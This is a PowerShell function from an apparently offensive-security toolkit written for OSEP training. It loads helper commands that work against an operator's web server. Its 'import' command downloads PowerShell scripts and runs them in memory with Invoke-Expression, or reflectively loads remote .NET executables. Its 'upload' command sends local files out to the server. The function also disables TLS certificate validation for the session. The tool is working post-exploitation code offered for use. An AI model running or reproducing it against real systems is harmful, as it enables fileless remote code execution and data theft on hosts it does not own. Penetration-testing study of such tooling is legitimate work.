function Load-WebClientHelpers {
#.SYNOPSIS
# Load simple WebClient Helper scripts for file transfers and importing data into memory.
# AUTHOR: Tyler McCann (@tylerdotrar)
# ARBITRARY VERSION NUMBER: 2.0.0
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to load a handful of simple WebClient
# Helper scripts into the Global session for seamless communication with the PMA web server.
# If the PMA server is using HTTPS but no HTTPS bypass has been loaded into the session, 
# this script will load the bypass prior to the Helper Scripts.
#
# Current helper scripts:
#   import <filename>    -->  Load/reflect PowerShell scripts or C# binaries into the session
#   download <filename>  -->  Download files from the PMA web server
#   upload <filename>    -->  Upload files to the PMA web server
#
# Parameters:
#   -WebClientURL        -->  Server URL to point WebClient helpers to
#   -Help                -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
    

    Param(
        [string]$WebClientURL = 'http(s)://<ip_addr>',
        [switch]$Help
    )


    # Return Get-Help Information
    if ($Help) { return Get-Help Load-WebClientHelpers }


    # Error Correction
    if ($WebClientURL -eq 'http(s)://<ip_addr>') { return (Write-Host 'Input URL to point WebClient helpers to.' -ForegroundColor Red) }
    if ($WebClientURL -notlike "http*") { return 'Invalid URL format.' }


    # Bypass Self-Signed Certificate Restriction if not already loaded into the session
    if ($WebClientURL -like "https*") {

        if (([System.Net.ServicePointManager]::ServerCertificateValidationCallback).Method.DeclaringType.Name -ne 'SelfSignedCerts') {
        
            $CertBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static void Bypass()
    {
        ServicePointManager.ServerCertificateValidationCallback =
            delegate
            (
                Object obj,
                X509Certificate certificate,
                X509Chain chain,
                SslPolicyErrors errors
            )
            {
                return true;
            };
    }
}
'@
            Add-Type $CertBypass
            [SelfSignedCerts]::Bypass()
            echo "[+] HTTPS Bypass Loaded"
        }
    }   

    
    # Load WebClient Helpers into the Global Scope
    $global:WebClientURL = $WebClientURL

    function global:download ([string]$File){;
        if (!$File) {return 'Error: Must input file.'};
        $Filepath = (PWD).Path + "/$File";
        (New-Object System.Net.WebClient).DownloadFile("$global:WebClientURL/d/$File","$Filepath");
        if (Test-Path -LiteralPath $File) {return 'SUCCESSFUL DOWNLOAD'}
        else {return 'Error: Unsuccessful download.'};
    }
    echo '[+] Function Loaded: "download"'

    function global:upload ([string]$File){;
        if (!$File) {return 'Error: Must input file.'};
        if (!(Test-Path -LiteralPath $File)) { return 'Error: File not found.' };
        $Filename = (Get-Item -LiteralPath $File).BaseName;
        $Filepath = (Get-Item -LiteralPath $File).FullName;
        $Response = (New-Object System.Net.WebClient).UploadFile("$global:WebClientURL/u/$Filename","$Filepath");
        $FinalMessage = [System.Text.Encoding]::Ascii.GetString($Response);
        return $FinalMessage;
    }
    echo '[+] Function Loaded: "upload"'

    function global:import ([string]$File){;
        if (!$File) {return 'Error: Must input file.'}; Try {
        if ($File -like '*.exe') {
        [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("$global:WebClientURL/d/$File"));
        return "REFLECTION SUCCESSFUL" } else {
        $Contents = ((New-Object System.Net.WebClient).DownloadString("$global:WebClientURL/d/$File"));
        if (!($Contents -like '*function global:*')) {$Contents = $Contents.Replace('function ','function global:')};
        Invoke-Expression $Contents;
        return "IMPORT SUCCESSFUL"}} Catch {return 'Error: Import unsuccessful.'};
    }
    echo '[+] Function Loaded: "import"'
}